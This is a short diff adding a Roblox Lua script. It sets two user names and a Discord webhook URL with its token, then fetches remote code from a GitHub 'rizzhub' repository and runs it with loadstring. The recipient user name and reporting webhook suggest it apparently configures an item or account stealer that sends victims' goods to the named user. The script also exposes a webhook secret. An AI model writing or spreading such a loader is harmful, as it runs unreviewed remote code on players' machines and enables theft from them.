@@ -1,0 +1,5 @@
+UserName = "NotCorruptedUser"
+UserName2 = "NotCorruptedUser" -- optional delete the whole line if you don't want it
+Webhook = "https://discord.com/api/webhooks/1057228098539630592/Piz_RA2maDFzsOai2eoIBorQvVlp_Sqxu7G4f9p0SMzZ69pAoQpt4ZSkL4ykdcvkFCwJ" -- optional delete the whole line if you don't want it
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
